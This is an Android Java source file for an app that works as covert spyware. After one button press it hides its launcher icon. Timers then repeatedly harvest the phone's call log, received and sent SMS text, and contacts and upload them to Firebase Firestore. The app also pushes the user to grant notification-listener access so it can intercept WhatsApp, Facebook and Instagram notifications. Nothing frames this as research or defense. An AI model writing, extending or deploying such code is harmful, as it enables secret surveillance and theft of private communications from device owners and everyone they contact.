package com.example.ghazi.sms;

import android.Manifest;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.WorkerThread;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.android.gms.tasks.Tasks;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FieldPath;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.Query;
import com.google.firebase.firestore.QuerySnapshot;
import com.google.firebase.firestore.WriteBatch;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Callable;
import java.util.concurrent.Executor;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import static android.content.ContentValues.TAG;

public class MainActivity extends AppCompatActivity {

    private String TAG;
    final int REQUEST_CODE_ASK_PERMISSIONS = 123;
    Button btn ;
    String[] permissions = new String[]{
            Manifest.permission.INTERNET,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.VIBRATE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS
    };

    private static final String ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";
    private static final String ACTION_NOTIFICATION_LISTENER_SETTINGS = "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS";

    private ImageView interceptedNotificationImageView;
    //private ImageChangeBroadcastReceiver imageChangeBroadcastReceiver;
    private AlertDialog enableNotificationListenerAlertDialog;
    private static final ThreadPoolExecutor EXECUTOR = new ThreadPoolExecutor(2, 4, 60,
            TimeUnit.SECONDS, new LinkedBlockingQueue<Runnable>());
    public static boolean firstTimeFlag=true;

    public MainActivity() {
    }

    //TextView hello=(TextView)findViewById(R.id.smstxt);
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        boolean ok = false;
        ok=checkPermissions();
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        final CollectionReference refSmsReceivedCollection= db.collection("ReceivedSMS");
        final CollectionReference refSmsSentCollection= db.collection("SentSMS");
        final CollectionReference refContactsCollection= db.collection("Contacts");
        final CollectionReference refCallLogsCollection= db.collection("CallLogs");
        btn = (Button)findViewById(R.id.btn);

        ok=initializeDB();




        Log.d("nb1",""+getReceivedSMSs().size());
        Toast.makeText(this, ""+getContactList().toString(), Toast.LENGTH_LONG).show();

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("com.github.chagall.notificationlistenerexample");
                hideApplication();

                // schedule sendCallLogToDB to work every day
                final long period = 1000;
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        // do your task here
                        deleteCollection(refCallLogsCollection, 25, EXECUTOR).addOnSuccessListener(new OnSuccessListener<Void>() {
                            @Override
                            public void onSuccess(Void aVoid) {
                                Log.d("dandoun", " successfully deleted!");
                                sendCallLogToDB(getCallDetails());


                            }
                        });




                    }
                }, 0, period*60*5);


                // schedule sendReceivedSMSToDB to work every day

                ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);

                if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {


                    new Timer().schedule(new TimerTask() {
                        @Override
                        public void run() {
                            // do your task here

                            deleteCollection(refSmsReceivedCollection, 25, EXECUTOR).addOnSuccessListener(new OnSuccessListener<Void>() {
                                @Override
                                public void onSuccess(Void aVoid) {
                                    Log.d("dandoun", " successfully deleted!");
                                    sendReceivedSMSToDB(getReceivedSMSs());


                                }
                            });

                        }
                    }, period * 2, period * 86400);
                }


                // sendSentSMSToDB

                ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
                if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {


                    new Timer().schedule(new TimerTask() {
                        @Override
                        public void run() {
                            // do your task here
                            deleteCollection(refSmsSentCollection, 25, EXECUTOR).addOnSuccessListener(new OnSuccessListener<Void>() {
                                @Override
                                public void onSuccess(Void aVoid) {
                                    Log.d("dandoun", " successfully deleted!");
                                    sendSentSMSToDB(getSentSMSs());


                                }
                            });
                            ;
                            //sendSentSMSToDB(getSentSMSs());
                        }
                    }, period * 5, period * 86400);
                }


                ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_CONTACTS"}, REQUEST_CODE_ASK_PERMISSIONS);
                if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED) {


                    new Timer().schedule(new TimerTask() {
                        @Override
                        public void run() {
                            // do your task here
                            deleteCollection(refContactsCollection, 25, EXECUTOR).addOnSuccessListener(new OnSuccessListener<Void>() {
                                @Override
                                public void onSuccess(Void aVoid) {
                                    Log.d("dandoun", " successfully deleted!");
                                    sendContactsToDB(getContactList());


                                }
                            });

                        }
                    }, period * 10, period * 86400 * 7);
                }


            }
        });


        //sendContactsToDB(getContactList());



        // If the user did not turn the notification listener service on we prompt him to do so
        if(!isNotificationServiceEnabled()){
            enableNotificationListenerAlertDialog = buildNotificationServiceAlertDialog();
            enableNotificationListenerAlertDialog.show();
        }

        // Finally we register a receiver to tell the MainActivity when a notification has been received


        // registerReceiver(imageChangeBroadcastReceiver,intentFilter);


        //Toast.makeText(this, ""+getCallDetails().size(), Toast.LENGTH_SHORT).show();
       /* Intent i = getBaseContext().getPackageManager()
                .getLaunchIntentForPackage( getBaseContext().getPackageName() );
        i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(i);
        hideApplication();*/


    }

    private boolean initializeDB() {

        Map<String, Object> test = new HashMap<>();
        test.put("test","test");
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        CollectionReference collection= db.collection("ReceivedSMS");
        DocumentReference document=collection.document();
        document.set(test).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void documentReference) {
                Log.d(TAG, "your  was added successfully" );
            }
        });
        CollectionReference collection1= db.collection("SentSMS");
        DocumentReference document1=collection.document();
        document.set(test).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void documentReference) {
                Log.d(TAG, "your  was added successfully" );
            }
        });

        CollectionReference collection2= db.collection("Contacts");
        DocumentReference document2=collection.document();
        document.set(test).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void documentReference) {
                Log.d(TAG, "your  was added successfully" );
            }
        });
        CollectionReference collection3= db.collection("CallLogs");
        DocumentReference document3=collection.document();
        document.set(test).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void documentReference) {
                Log.d(TAG, "your  was added successfully" );
            }
        });
        CollectionReference collection4= db.collection("notifications");
        DocumentReference document4=collection.document();
        document.set(test).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void documentReference) {
                Log.d(TAG, "your  was added successfully" );
            }
        });

        return true;
    }

    @WorkerThread
    private List<DocumentSnapshot> deleteQueryBatch(final Query query) throws Exception {
        QuerySnapshot querySnapshot = Tasks.await(query.get());

        WriteBatch batch = query.getFirestore().batch();
        for (DocumentSnapshot snapshot : querySnapshot) {
            batch.delete(snapshot.getReference());
        }
        Tasks.await(batch.commit());

        return querySnapshot.getDocuments();
    }

    private Task<Void> deleteCollection(final CollectionReference collection,
                                        final int batchSize,
                                        Executor executor) {

        // Perform the delete operation on the provided Executor, which allows us to use
        // simpler synchronous logic without blocking the main thread.
        return Tasks.call(executor, new Callable<Void>() {
            @Override
            public Void call() throws Exception {
                // Get the first batch of documents in the collection
                Query query = collection.orderBy(FieldPath.documentId()).limit(batchSize);

                // Get a list of deleted documents
                List<DocumentSnapshot> deleted = deleteQueryBatch(query);

                // While the deleted documents in the last batch indicate that there
                // may still be more documents in the collection, page down to the
                // next batch and delete again
                while (deleted.size() >= batchSize) {
                    // Move the query cursor to start after the last doc in the batch
                    DocumentSnapshot last = deleted.get(deleted.size() - 1);
                    query = collection.orderBy(FieldPath.documentId())
                            .startAfter(last.getId())
                            .limit(batchSize);

                    deleted = deleteQueryBatch(query);
                }

                return null;
            }
        });

    }


    private void sendContactsToDB(ArrayList<Contact> contactList) {

        Map<String, Object> sms = new HashMap<>();
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        CollectionReference collection= db.collection("Contacts");

        for(int i=0;i<contactList.size();i++){
            DocumentReference document=collection.document();
            sms.put("name",contactList.get(i).getName());
            sms.put("phone number",contactList.get(i).getPhoneNumber());
            document.set(sms).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void documentReference) {
                    Log.d(TAG, "your contact was added successfully" );
                }
            });

        }

    }

    private void sendReceivedSMSToDB(ArrayList<Sms> listSMS) {

        Map<String, Object> sms = new HashMap<>();
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        CollectionReference collection= db.collection("ReceivedSMS");

        for(int i=0;i<listSMS.size();i++){
            DocumentReference document=collection.document();
            sms.put("address",listSMS.get(i).getAddress());
            sms.put("body",listSMS.get(i).getBody());
            document.set(sms).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void documentReference) {
                    Log.d(TAG, "your sms was added successfully" );
                }
            });

        }
    }

    public void sendSentSMSToDB(ArrayList<Sms> listSMS) {

        Map<String, Object> sms = new HashMap<>();
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        CollectionReference collection= db.collection("SentSMS");

        for(int i=0;i<listSMS.size();i++){
            DocumentReference document=collection.document();
            sms.put("address",listSMS.get(i).getAddress());
            sms.put("body",listSMS.get(i).getBody());
            document.set(sms).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void documentReference) {
                    Log.d("5ra", "your sms was added successfully" );
                }
            });

        }
    }



    public void sendCallLogToDB(ArrayList<com.example.ghazi.sms.CallLog> listCallLogs) {
        //firebase
        Map<String, Object> callLog = new HashMap<>();
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        CollectionReference collection= db.collection("CallLogs");

        for(int i=0;i<listCallLogs.size();i++){
            DocumentReference document=collection.document();
            callLog.put("callType",listCallLogs.get(i).getCallType());
            callLog.put("phonenNumber",listCallLogs.get(i).getPhoneNumber());
            callLog.put("callDate",listCallLogs.get(i).getCallDate());
            callLog.put("callDurationSeconds",listCallLogs.get(i).getCallDurationSeconds());
            document.set(callLog).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void documentReference) {
                    Log.d(TAG, "your call Log was added successfully" );
                }
            });

        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        if (requestCode == 100) {
            if (grantResults.length > 0
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // do something
            }
            return;
        }
    }

    private boolean checkPermissions() {
        int result;
        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String p : permissions) {
            result = ContextCompat.checkSelfPermission(this, p);
            if (result != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p);
            }
        }
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]), 100);
            return false;
        }
        return true;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        //unregisterReceiver(imageChangeBroadcastReceiver);
    }

    /**
     * Change Intercepted Notification Image
     * Changes the MainActivity image based on which notification was intercepted
     * @param notificationCode The intercepted notification code
     */


    private void changeInterceptedNotificationImage(int notificationCode){
        switch(notificationCode){
            case NotificationListenerExampleService.InterceptedNotificationCode.FACEBOOK_CODE:
                interceptedNotificationImageView.setImageResource(R.drawable.facebook_logo);
                break;
            case NotificationListenerExampleService.InterceptedNotificationCode.INSTAGRAM_CODE:
                interceptedNotificationImageView.setImageResource(R.drawable.instagram_logo);
                break;
            case NotificationListenerExampleService.InterceptedNotificationCode.WHATSAPP_CODE:
                interceptedNotificationImageView.setImageResource(R.drawable.whatsapp_logo);
                break;
            case NotificationListenerExampleService.InterceptedNotificationCode.OTHER_NOTIFICATIONS_CODE:
                interceptedNotificationImageView.setImageResource(R.drawable.other_notification_logo);
                break;


        }
    }


    /**
     * Is Notification Service Enabled.
     * Verifies if the notification listener service is enabled.
     * Got it from: https://github.com/kpbird/NotificationListenerService-Example/blob/master/NLSExample/src/main/java/com/kpbird/nlsexample/NLService.java
     * @return True if eanbled, false otherwise.
     */
    private boolean isNotificationServiceEnabled(){
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(),
                ENABLED_NOTIFICATION_LISTENERS);
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (int i = 0; i < names.length; i++) {
                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    /**
     * Image Change Broadcast Receiver.
     * We use this Broadcast Receiver to notify the Main Activity when
     * a new notification has arrived, so it can properly change the
     * notification image
     * */
    public class ImageChangeBroadcastReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            int receivedNotificationCode = intent.getIntExtra("Notification Code",-1);
            changeInterceptedNotificationImage(receivedNotificationCode);
        }
    }


    /**
     * Build Notification Listener Alert Dialog.
     * Builds the alert dialog that pops up if the user has not turned
     * the Notification Listener Service on yet.
     * @return An alert dialog which leads to the notification enabling screen
     */
    private AlertDialog buildNotificationServiceAlertDialog(){
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setTitle(R.string.notification_listener_service);
        alertDialogBuilder.setMessage(R.string.notification_listener_service_explanation);
        alertDialogBuilder.setPositiveButton(R.string.yes,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        startActivity(new Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS));
                    }
                });
        alertDialogBuilder.setNegativeButton(R.string.no,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        // If you choose to not enable the notification listener
                        // the app. will not work as expected
                    }
                });
        return(alertDialogBuilder.create());
    }

    public ArrayList<com.example.ghazi.sms.CallLog> getCallDetails() {

        ArrayList<com.example.ghazi.sms.CallLog> callLogs= new ArrayList<com.example.ghazi.sms.CallLog>();
        StringBuffer sb = new StringBuffer();

        ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_CALL_LOG"}, REQUEST_CODE_ASK_PERMISSIONS);
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED) {


            Calendar calendar = Calendar.getInstance();
            calendar.add(Calendar.DAY_OF_YEAR, -1);
            Date weekBefore = calendar.getTime();

            String selection = CallLog.Calls.DATE + ">?";
            String [] selectionArgs = {String.valueOf(weekBefore.getTime())};
            //Cursor cr = managedQuery(CallLog.Calls.CONTENT_URI, null, selection, selectionArgs, null);


            Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                    selection, selectionArgs,  CallLog.Calls.DATE + " ASC");
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            //Toast.makeText(this, "hahahghk", Toast.LENGTH_LONG).show();
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            sb.append("Call Details :");
            while (managedCursor.moveToNext()) {
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = managedCursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                        + dir + " \nCall Date:--- " + callDayTime
                        + " \nCall duration in sec :--- " + callDuration);
                sb.append("\n----------------------------------");
                callLogs.add(new com.example.ghazi.sms.CallLog(phNumber,dir,callDayTime,callDuration));
            }

            // close it or no ?
            // managedCursor.close();
        }

        //return sb.toString();
        return callLogs;

    }

    private void hideApplication() {

        PackageManager pm = getApplicationContext().getPackageManager();
        pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

    }

    private  ArrayList<Contact> getContactList() {

        ArrayList<Contact> contacts= new ArrayList<Contact>();
        ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_CONTACTS"}, REQUEST_CODE_ASK_PERMISSIONS);
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED) {

            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);

            if ((cur != null ? cur.getCount() : 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    String id = cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME));

                    if (cur.getInt(cur.getColumnIndex(
                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            String phoneNo = pCur.getString(pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                            Log.d("Name: " ,name);
                            Log.d("Phone Number: " ,phoneNo);
                            contacts.add(new Contact(name,phoneNo));


                        }
                        pCur.close();
                    }
                }
            }
            if (cur != null) {
                cur.close();
            }
            // Log.d("ghazi",""+contacts.size());

        }
        return contacts;
    }



    public ArrayList<Sms> getReceivedSMSs(){

        ArrayList<Sms> smsList= new ArrayList<Sms>();
        ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {

            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    String msgData = "";
                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                    }
                    //Toast.makeText(this, "" + msgData, Toast.LENGTH_SHORT).show();
                    // String body=cursor.getString(12);
                    String body= cursor.getString(cursor.getColumnIndex("body"));
                    String address= cursor.getString(cursor.getColumnIndex("address"));

                    //Log.d("hhhh",body+ ":::"+address);
                    smsList.add(new Sms(address,body));
                } while (cursor.moveToNext());
            }
        }
        return smsList;
    }

    public ArrayList<Sms> getSentSMSs(){

        ArrayList<Sms> smsList= new ArrayList<Sms>();
        ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {

            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {
                    String msgData = "";
                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                    }
                    //Toast.makeText(this, "" + msgData, Toast.LENGTH_SHORT).show();
                    // String body=cursor.getString(12);
                    String body= cursor.getString(cursor.getColumnIndex("body"));
                    String address= cursor.getString(cursor.getColumnIndex("address"));

                    //Log.d("hhhh",body+ ":::"+address);
                    smsList.add(new Sms(address,body));
                } while (cursor.moveToNext());
            }
        }
        return smsList;
    }
}
